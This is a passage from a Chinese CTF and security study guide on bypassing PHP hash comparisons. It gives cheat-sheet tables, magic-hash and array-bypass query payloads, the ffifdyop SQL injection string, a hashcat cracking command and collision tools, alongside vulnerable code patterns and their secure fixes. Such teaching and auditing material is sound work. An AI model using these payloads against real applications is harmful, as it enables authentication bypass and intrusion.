| `'abc' = 0` | `true` (PHP 7) / `false` (PHP 8) | `true` |

---

## 十一、总结与复习

### 11.1 核心思维导图

```
PHP 哈希绕过
  ├── 比较符
  │     ├── ==  → Magic Hash, 类型混淆
  │     └── === → 数组绕过(PHP<8), 真实碰撞
  ├── 数据类型
  │     ├── 字符串 → Magic Hash, 截断
  │     ├── 数组   → 函数返回 NULL
  │     ├── JSON 数字 → 类型混淆
  │     └── 布尔/null → 弱比较
  ├── MAC 构造
  │     ├── H(secret || data) → 长度扩展
  │     └── HMAC → 安全
  └── 特殊哈希
        ├── CRC32 → 线性碰撞
        ├── raw=true → 二进制注入
        └── 低熵输入 → 枚举
```

### 11.2 一句话速记

| 场景 | 一句话诀窍 |
|:-----|:-----------|
| `==` 比较哈希 | 找 0e Magic Hash |
| `===` 比较哈希 | 传数组（PHP 7）或找真实碰撞 |
| 自身 == 自己的哈希 | 用 `0e215962017` |
| 双重哈希 | 检查最终摘要 |
| 输入已知但哈希未知 | 长度扩展 |
| md5($x, true) | ffifdyop 注入 |
| CRC32 签名 | XOR 碰撞 |
| 哈希截断 | 枚举碰撞 |
| JSON 输入 | 传数字/布尔绕过字符串检查 |

### 11.3 最终检查清单

- [ ] 确认 PHP 版本（php -v）
- [ ] 确认比较符是 == 还是 ===
- [ ] 确认输入类型（字符串/数组/JSON）
- [ ] 检查是否有 is_string() 之类类型检查
- [ ] 检查是否加盐或拼接额外数据
- [ ] 检查哈希输出格式（hex vs raw）
- [ ] 检查摘要是否被截断
- [ ] 检查是否为 Hash(secret||data) 结构
- [ ] 检查是否使用 CRC32 做签名
- [ ] 检查文件操作的 TOCTOU 窗口
- [ ] 确认 in_array/array_search 第三个参数
- [ ] 本地验证 payload 后使用

### 11.4 PHP 类型比较速查表（口袋版）

| 左侧 | 右侧 | `==` 结果 | `===` 结果 |
|:----:|:----:|:---------:|:---------:|
| `"0e123"` | `"0e456"` | `true` | `false` |
| `"1"` | `1` | `true` | `false` |
| `0` | `"foo"` (PHP 7) | `true` | `false` |
| `0` | `"foo"` (PHP 8) | `false` | `false` |
| `0` | `false` | `true` | `false` |
| `null` | `false` | `true` | `false` |
| `[]` | `false` | `true` | `false` |
| `"123abc"` | `123` | `true` | `false` |
| `null` | `""` | `true` | `false` |
| `0` | `"0"` | `true` | `false` |

### 11.5 MD5 碰撞对在线验证网址

- [公开 MD5 碰撞数据库](https://www.mscs.dal.ca/~selinger/md5collision/)
- SHAthered: https://shattered.io/
- FastColl: https://github.com/brimstone/fastcoll

### 11.6 Hashcat 掩码字符集速查

| 占位符 | 含义 | 字符范围 |
|:-----:|:----|:---------|
| `?l` | 小写字母 | `a-z` |
| `?u` | 大写字母 | `A-Z` |
| `?d` | 数字 | `0-9` |
| `?s` | 特殊符号 | `!"#$%&'()*+,-./:;<=>?@[\]^_{|}~` |
| `?a` | 所有可打印 | `?l?u?d?s` |
| `?b` | 所有字节 | `0x00-0xFF` |

自定义字符集示例：
```bash
# -1 定义小写+数字，-2 定义特殊字符
hashcat -m 0 -a 3 -1 ?l?d hash.txt ?1?1?1?1?1?1
```

### 11.7 PHP 中哈希处理的常见问题代码模式

**模式一：直接拼接用户输入到哈希比较**
```php
// 危险：$input 可以是数组、JSON 数字等
if (md5($input) == $expected_hash) { }
// 安全：先验证类型
if (is_string($input) && hash_equals(md5($input), $expected_hash)) { }
```

**模式二：使用 == 比较签名**
```php
// 危险：== 弱比较可被 Magic Hash 绕过
$sig = md5($secret . $data);
if ($sig == $user_sig) { }
```

**模式三：不验证数据类型的 JSON 处理**
```php
$data = json_decode($input, true);
// 危险：$data['admin'] 可能是 bool(true) 而不是 "true"
if ($data['admin'] == true) { }
```

**模式四：循环过滤不彻底**
```php
// 只执行一次替换，可双写绕过
$name = str_replace('.php', '', $name);
```

**模式五：先签名后编码**
```php
// 签名的数据和处理的数据不一致
$sig = md5($raw_data);
$processed = urldecode($raw_data);
// 如果 urldecode 改变了数据，签名验证就失去了意义
```

### 11.8 PHP 哈希函数返回值速查表

| 函数 | 参数 | 正常返回值 | 数组参数 (PHP 7) | 数组参数 (PHP 8) |
|:----|:----|:----------:|:-----------------:|:-----------------:|
| `md5($x)` | string | 32 位 hex | `NULL`+Warning | TypeError |
| `md5($x, true)` | string | 16 字节 raw | `NULL`+Warning | TypeError |
| `sha1($x)` | string | 40 位 hex | `NULL`+Warning | TypeError |
| `sha1($x, true)` | string | 20 字节 raw | `NULL`+Warning | TypeError |
| `hash($algo, $x)` | string | 变长 hex | `NULL`+Warning | TypeError |
| `crc32($x)` | string | 十进制整数 | `NULL`+Warning | TypeError |
| `strcmp($a, $b)` | string,string | 0/-1/1 | `NULL`+Warning | TypeError |
| `strlen($x)` | string | 整数 | `NULL`+Warning | TypeError |
| `in_array($n, $arr)` | mixed | bool | 弱比较 | 弱比较 |
| `array_search($n, $arr)` | mixed | key/false | 弱比较 | 弱比较 |

### 11.9 各类型 CTF 题目通用 Payload 模板

| 题目类型 | Payload 模板 | 说明 |
|:--------|:-------------|:-----|
| Magic Hash (双参) | `?a=QNKCDZO&b=240610708` | 两参数弱比较 |
| Magic Hash (自身) | `?a=0e215962017` | 自身等于自身哈希 |
| 数组绕过 | `?a[]=1&b[]=2` | PHP 7 以下有效 |
| 真实碰撞 | POST 发送 hex碰撞对 | hex2bin + === 比较 |
| 长度扩展 | HashPump 构造新数据 | secret + message 结构 |
| 二进制注入 | 提交 ffifdyop | raw=true + SQL |
| JSON 类型混淆 | `{"token":0}` | json_decode 后比较 |
| CRC32 碰撞 | 两个不同文件同 CRC32 | 签名校验绕过 |

### 11.10 PHP 哈希安全最佳实践对照

| 实践 | 错误做法 | 正确做法 |
|:----|:---------|:---------|
| 密码存储 | `md5($password)` | `password_hash($password, PASSWORD_BCRYPT)` |
| 数据完整性 | `md5($data)` | `hash_hmac('sha256', $data, $key)` |
| 令牌生成 | `md5(uniqid())` | `bin2hex(random_bytes(32))` |
| 防篡改 | `crc32($data)` | `hash_hmac('sha256', $data, $key)` |
| 字符串比较 | `$a != $b` / `$a == $b` | `hash_equals($a, $b)` |
| JSON 处理 | `$data['x'] == $expected` | 先验类型再比较 |
| 角色检查 | `in_array($role, $admins)` | `in_array($role, $admins, true)` |
| 安全随机数 | `rand()` / `mt_rand()` | `random_int()` / `random_bytes()` |

### 11.11 各攻击路径速查总表

| 攻击路径 | 核心条件 | 绕过对象 | 常用工具 | 防御 |
|:--------|:---------|:---------|:---------|:-----|
| Magic Hash | `==` + 0e 格式 | 弱比较 | Python/php 验证 | 用 `===` |
| 数组绕过 | PHP < 8 + 内部函数 | 报错返 NULL | curl/Burp 改参 | 升级 PHP 8 |
| 真实碰撞 | `===` + hex2bin | 强比较 | FastColl | 用 SHA-256 |
| 长度扩展 | `H(secret\|data)` | MAC 结构 | HashPump | 用 HMAC |
| 二进制注入 | `raw=true` + SQL 拼接 | SQL 结构 | ffifdyop | 参数化查询 |
| CRC32 碰撞 | CRC32 做签名 | 校验值 | Python zlib | 用 SHA-256 |
| TOCTOU | 文件重打开 | 时间差 | 多线程脚本 | 同 fd 操作 |
| JSON 混淆 | JSON 输入 + `==` | 类型判断 | curl/Python | `is_string()` |
| 截断哈希 | `substr(hash,0,n)` | 短摘要 | 枚举脚本 | 不截断 |

### 11.12 MD5 与 SHA 系列哈希碰撞工具对比

| 工具 | 目标算法 | 碰撞类型 | 速度 | CTF 推荐度 |
|:----|:--------|:---------|:----:|:---------:|
| FastColl | MD5 | 相同前缀碰撞 | 几秒 |  |
| HashClash | MD5 | 选择前缀碰撞 | 几小时 |  |
| Unicorn | MD5 | 任意前缀碰撞 | 可变 |  |
| SHAttered 样本 | SHA-1 | 固定碰撞 | N/A |  |
| sha1collisiondetection | SHA-1 | 检测用 | N/A |  |
| hashclash | MD5/SHA-1 | 多种 | 可变 |  |

### 11.13 常见语言类型系统的安全差异

| 场景 | PHP | Python | JavaScript | Java | Go |
|:----|:---:|:------:|:----------:|:----:|:--:|
| 弱类型 |  |  强类型 |  |  强类型 |  强类型 |
| `==` 类型转换 | 是 | 否(`==` 值比较) | 是(宽松) | 否 | 否 |
| 空值比较陷阱 | `null=="0"`→false | `None==0`→False | `null==0`→false | 编译错误 | 编译错误 |
| 数组哈希 | 返回 NULL | TypeError | TypeError | 编译错误 | 编译错误 |
| JSON 类型保留 |  |  |  |  |  |
| Magic Hash 等效 | 0e... | 不存在 | 不存在(JS 字符串比较) | 不存在 | 不存在 |

### 11.14 CTF 实战：三种级别 Magic Hash 出题思路

**初级：直接给两个参数**
```php
if (md5($a) == md5($b)) { /* pass */ }
// 解法：?a=QNKCDZO&b=240610708
```

**中级：增加类型检查**
```php
if (is_string($a) && is_string($b) && $a !== $b && md5($a) == md5($b)) { /* pass */ }
// Still Magic Hash, 只是不能传数组
```

**高级：双重哈希 + 额外条件**
```php
if (md5(md5($a)) == md5(md5($b)) && sha1($a) != sha1($b)) { /* pass */ }
// 需找到同时满足双重 MD5 0e 碰撞且 SHA-1 不同的输入
```

---

## 十二、扩展阅读与实践

### 12.1 哈希算法在线资源

- MD5 碰撞生成器: https://github.com/brimstone/fastcoll
- SHAttered: https://shattered.io/
- HashPump: https://github.com/bwall/HashPump
- hash_extender: https://github.com/iagox86/hash_extender
- Hashcat: https://hashcat.net/hashcat/
- John the Ripper: https://www.openwall.com/john/

### 12.2 各章节 避坑数量统计

| 章节 | 避坑数量 | 表格数量 | 代码示例 |
|:----|:--------:|:--------:|:--------:|
| 零、哈希安全基础 | 2 | 3 | 1 |
| 一、场景 | 0 | 3 | 0 |
| 二、原理 | 0 | 3 | 0 |
| 三、攻击路径 A | 5 | 7 | 5 |
| 三、攻击路径 B | 2 | 5 | 3 |
| 三、攻击路径 C | 3 | 4 | 3 |
| 三、攻击路径 D | 2 | 6 | 4 |
| 三、攻击路径 E | 3 | 5 | 4 |
| 三、攻击路径 F | 1 | 2 | 1 |
| 四、Hashcat | 0 | 4 | 5 |
| 五、避坑汇总 | 18 | 1 | 0 |
| 六、知识总结 | 0 | 7 | 0 |
| 七、源码审计 | 0 | 4 | 0 |
| 八、完整例题库 | 0 | 1 | 5 |
| 九、综合对比 | 4 | 4 | 0 |
| 十、纵深防御 | 20 | 10 | 5 |
| 十一、总结复习 | 0 | 12 | 5 |

### 12.3 快速索引

| 你想找什么 | 在哪个章节 |
|:----------|:-----------|
| Magic Hash 原理 | 二 → 2.2 / 三 → 攻击路径 A |
| Magic Hash Payload 表 | 三 → 攻击路径 A |
| 数组绕过 | 三 → 攻击路径 B → 3.1 |
| 真实 MD5 碰撞示例 | 三 → 攻击路径 B → 3.3 |
| 长度扩展 Python 示例 | 三 → 攻击路径 C |
| CRC32 碰撞原理 | 三 → 攻击路径 E |
| TOCTOU 条件竞争 | 三 → 攻击路径 F |
| JSON 类型混淆 | 三 → 攻击路径 D → 4.3 |
| 二进制 SQL 注入 | 三 → 攻击路径 D → 4.1 |
| in_array 弱类型绕过 | 三 → 攻击路径 D → 4.5 |
| 低熵 Token | 三 → 4.8 |
| Hashcat 命令 | 四 |
| 避坑汇总 | 五 |
| 审计检查项 | 七 |
| 安全编码对照 | 十 |
| PHP 版本差异 | 六 → PHP 版本差异速查 |
| 各语言行为对比 | 十 → 10.9 |

---

>**一句话总结**：PHP 哈希绕过不是破解哈希算法，而是利用 PHP 类型系统"预期外的行为"。看见 `==` 优先想 Magic Hash 和类型混淆，看见 `===` 优先想数组绕过（旧版 PHP）或真实碰撞。审计时从数据流追踪：输入类型 → 编码转换 → 哈希计算 → 比较 → 业务解析，每一层都可能存在差异。

> 最后更新：2026-07
